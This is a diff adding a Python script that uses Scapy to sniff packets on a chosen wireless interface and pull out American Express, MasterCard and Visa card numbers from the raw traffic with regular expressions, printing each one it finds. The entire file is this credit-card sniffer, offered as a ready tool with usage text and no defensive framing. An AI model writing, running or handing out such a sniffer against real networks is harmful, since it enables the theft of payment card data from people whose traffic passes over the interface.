@@ -1,0 +1,42 @@
+import optparse
+import re  # Import the re module
+from scapy.all import *
+
+def cards(pkt):
+    # Extract raw data from pkt
+    raw = str(pkt)
+    
+    # Use re.findall to search for credit card numbers
+    american = re.findall(r'3[47][0-9]{13}', raw)
+    masterc = re.findall(r'5[1-5][0-9]{14}', raw)
+    visare = re.findall(r'4[0-9]{12}(?:[0-9]{3})?', raw)
+    
+    # Print found credit card numbers
+    if american:
+        print(f"[+] Found American Express card: {american[0]}")
+    if masterc:
+        print(f"[+] Found MasterCard: {masterc[0]}")
+    if visare:
+        print(f"[+] Found Visa card: {visare[0]}")
+
+def main():
+    parser = optparse.OptionParser("Usage: %prog -i <wlan0>")
+    parser.add_option("-i", dest="wlan0", type="string", help="wlan0")
+    
+    (options, args) = parser.parse_args()
+    if options.wlan0 is None:  # Use the correct variable name
+        print(parser.usage)
+        exit(1)
+    else:
+        conf.iface = options.wlan0  # Use the variable from options
+        print(f'[*] Listening on interface: {options.wlan0}')
+    
+    try:
+        print('[*] Starting credit card sniffer.')
+        sniff(iface=options.wlan0, prn=cards, store=0)  # Use the variable from options
+    except KeyboardInterrupt:
+        print("\n[!] Stopping credit card sniffer.")
+        exit(0)
+
+if __name__ == "__main__":
+    main()
